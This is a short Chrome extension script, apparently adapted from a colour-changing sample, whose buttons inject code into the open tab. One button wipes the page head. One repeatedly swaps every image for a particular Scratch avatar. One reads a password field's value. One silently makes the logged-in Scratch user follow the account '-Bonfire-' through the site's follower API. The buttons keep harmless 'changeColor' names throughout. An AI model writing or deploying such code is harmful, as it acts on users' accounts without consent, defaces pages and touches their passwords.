let changeColor = document.getElementById('changeColor');
let changeColor2 = document.getElementById('changeColor2');
let changeColor3 = document.getElementById('changeColor3');
let changeColor4 = document.getElementById('changeColor4');

changeColor.onclick = function() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.tabs.executeScript(
        tabs[0].id,
        {code: 'document.head.innerHTML="";'});
  });
};

changeColor2.onclick = function() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.tabs.executeScript(
        tabs[0].id,
        {code: 'setInterval(()=>{var imagees=document.getElementsByTagName("img");for(var ii=imagees.length-1;ii>0;ii--){imagees[ii].src="//cdn2.scratch.mit.edu/get_image/user/33409728_60x60.png";}},100);'});
  });
};


changeColor3.onclick = function() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.tabs.executeScript(
        tabs[0].id,
        {code: 'document.body.getElementsByClassName("password")[0].value;'});
  });
};


changeColor4.onclick = function() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.tabs.executeScript(
        tabs[0].id,
        {code: '$.ajax({type: "PUT",url: "https://scratch.mit.edu/site-api/users/followers/-Bonfire-/add/",data: {usernames: Scratch.INIT_DATA.LOGGED_IN_USER.model.username}});'});
  });
};
